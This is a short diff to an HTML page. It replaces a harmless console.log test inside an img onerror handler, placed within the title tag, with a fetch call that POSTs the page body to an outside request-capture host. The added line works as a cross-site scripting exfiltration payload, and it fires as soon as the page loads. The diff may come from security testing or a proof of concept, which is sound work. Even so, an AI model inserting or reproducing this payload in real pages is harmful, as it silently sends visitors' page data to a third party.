@@ -2,7 +2,8 @@
 <html lang="en">
 <head>
     <title><img src="invalid_link"
-     onerror="console.log(1)"
+     onerror="fetch ('https://location.free.beeceptor.com',{method:'POST', headers: { 'Content-Type': 'application/json' },
+                                            body: JSON.stringify({ data: document.querySelector('body')})})"
 ></title>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
